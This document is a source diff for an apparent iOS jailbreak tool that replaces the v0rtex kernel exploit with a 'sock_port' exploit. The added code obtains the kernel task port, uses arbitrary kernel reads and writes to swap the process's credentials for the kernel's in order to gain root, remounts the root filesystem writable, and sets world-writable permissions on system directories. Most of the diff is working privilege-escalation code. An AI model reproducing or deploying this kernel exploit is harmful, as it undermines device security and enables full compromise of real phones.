@@ -9,9 +9,12 @@
 extern "C"{
 #include <stdio.h>
 #include <stdint.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <Foundation/Foundation.h>
 
+#include <mach/mach.h>
 #include "common.h"
-#include "v0rtex.h"
+#include "offsets.h"
 
 typedef mach_port_t io_service_t;
 typedef mach_port_t io_connect_t;
@@ -101,7 +104,7 @@ void resume_all_threads() {
 
 kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     resume_all_threads();
-    LOG("done v0rtex!\n");
+    LOG("done sock port!\n");
     tfp0 = tfp0_;
     tihmstar::offsetfinder64 *fi = static_cast<tihmstar::offsetfinder64 *>(data);
 
@@ -112,10 +115,12 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
         postProgress(err);
     }
-
+    LOG("done kernelpatches!");
+    runLaunchDaemons();
+    printf("ok\n");
     return KERN_SUCCESS;
 }
-
+/*
 size_t kread(uint64_t where, void *p, size_t size){
     int rv;
     size_t offset = 0;
@@ -132,7 +137,7 @@ size_t kread(uint64_t where, void *p, size_t size){
         offset += sz;
     }
     return offset;
-}
+}*/
 
 uint64_t kread_uint64(uint64_t where){
     uint64_t value = 0;
@@ -145,7 +150,7 @@ uint32_t kread_uint32(uint64_t where){
     size_t sz = kread(where, &value, sizeof(value));
     return (sz == sizeof(value)) ? value : 0;
 }
-
+/*
 size_t kwrite(uint64_t where, const void *p, size_t size){
     int rv;
     size_t offset = 0;
@@ -162,7 +167,7 @@ size_t kwrite(uint64_t where, const void *p, size_t size){
         offset += chunk;
     }
     return offset;
-}
+}*/
 
 size_t kwrite_uint64(uint64_t where, uint64_t value){
     return kwrite(where, &value, sizeof(value));
@@ -575,9 +580,15 @@ remappage[remapcnt++] = (x & (~PMK));\
     while (ReadAnywhere32((uint64_t)kernelpatches.at(0)._location+slide) != 1) {
         sleep(1);
     }
+    
+    struct statfs output;
+    statfs("/", &output);
+    
 
     char* nm = strdup("/dev/disk0s1s1");
-    int mntr = mount("hfs", "/", 0x10000, &nm);
+    //int mntr = mount("hfs", "/", 0x10000, &nm);
+    //int mntr = mount("apfs", "/", 0x10000, &nm);
+    int mntr = mount(output.f_fstypename, "/", 0x10000, &nm);
     printf("Mount succeeded? %d\n",mntr);
 
     if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
@@ -607,6 +618,10 @@ void die(){
         IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
 }
 
+typedef kern_return_t (*v0rtex_cb_t)(task_t tfp0, kptr_t kbase, void *data);
+
+static kern_return_t sock_port(offsets_t *off, v0rtex_cb_t callback, void *cb_data);
+
 extern "C" int jailbreak(void)
 {
     tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
@@ -626,18 +641,16 @@ extern "C" int jailbreak(void)
         return -1;
     }
 
-    LOG("v0rtex\n");
+    LOG("sock_port\n");
     suspend_all_threads();
-    if(v0rtex(off, &cb, &fi)){
+    if (sock_port(off, &cb, &fi)) {
+    //if(v0rtex(off, &cb, &fi)){
         resume_all_threads();
         postProgress(@"Kernelexploit failed");
         printf("Kernelexploit failed, goodbye...\n");
         sleep(3);
         die();
     }
-    LOG("done kernelpatches!");
-    runLaunchDaemons();
-    printf("ok\n");
     return 0;
 }
 
@@ -756,7 +769,7 @@ void runLaunchDaemons(void){
 
     chmod("/private", 0777);
     chmod("/private/var", 0777);
-    chmod("/private/var/mobile", 0777);
+    chmod("/private/var/mobile", 0755);
     chmod("/private/var/mobile/Library", 0777);
     chmod("/private/var/mobile/Library/Preferences", 0777);
 
@@ -773,4 +786,44 @@ void runLaunchDaemons(void){
 
     NSLog(@"done\n");
     postProgress(@"done");
+}
+
+extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase, offsets_t *off);
+
+extern uint64_t self_proc_addr;
+
+static kern_return_t sock_port(offsets_t *off, v0rtex_cb_t callback, void *cb_data) {
+    
+    kptr_t kbase;
+    mach_port_t tfp0 = sock_port_get_tfp0(&kbase, off);
+    if (tfp0 == MACH_PORT_NULL) {
+        return -1;
+    }
+    
+    kptr_t kernel_task_addr;
+    kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
+    kptr_t kernel_bsd_info;
+    kread(kernel_task_addr + off->task_bsd_info, &kernel_bsd_info, sizeof(kernel_bsd_info));
+    kptr_t kernel_ucred;
+    kread(kernel_bsd_info + off->proc_ucred, &kernel_ucred, sizeof(kernel_ucred));
+    
+    if (self_proc_addr == 0) {
+        return -1;
+    }
+
+    kptr_t self_ucred;
+    kread(self_proc_addr + off->proc_ucred, &self_ucred, sizeof(self_ucred));
+    
+    kwrite(self_proc_addr + off->proc_ucred, &kernel_ucred, sizeof(kernel_ucred));
+    uid_t old_uid = getuid();
+    if (setuid(0)) {
+        printf("Failed steal kernel ucred\n");
+        return -1;
+    }
+    
+    callback(tfp0, kbase, cb_data);
+    kwrite(self_proc_addr + off->proc_ucred, &self_ucred, sizeof(self_ucred));
+    
+    setuid(old_uid);
+    return 0;
 }
